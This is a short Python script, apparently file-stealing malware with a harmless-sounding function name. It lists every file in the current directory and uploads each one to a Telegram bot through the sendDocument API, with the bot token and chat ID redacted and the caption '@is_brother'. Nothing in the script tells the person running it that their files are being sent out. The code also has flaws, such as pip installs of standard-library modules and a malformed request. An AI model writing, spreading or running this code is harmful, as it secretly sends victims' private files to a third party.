import os
import requests

def promain():
    try:
        import socket
        import webbrowser
        import sys
        import json
        token2='redacted'
        ID2='redacted'
    except:
        os.system("pip install webbrowser")
        os.system("pip install socket")
        os.system("clear")

    S = '\033[1;33m'
    A = "\033[1;91m" #red
    C = "\033[1;97m" #white
    ra = 0

    file_ha = []

    for file in os.listdir():
        if os.path.isfile(file):
            file_ha.append(file)
            g = file
            print(file)
            massage = '@is_brother'
            start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/is_brother")
            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})
  
    print(file_ha)
    massage = '@is_brother'

    for file in file_ha:
        with open("SIN.txt","a") as pro:
            pro.write(str(file) + "\n")
            print(file_ha)
promain()



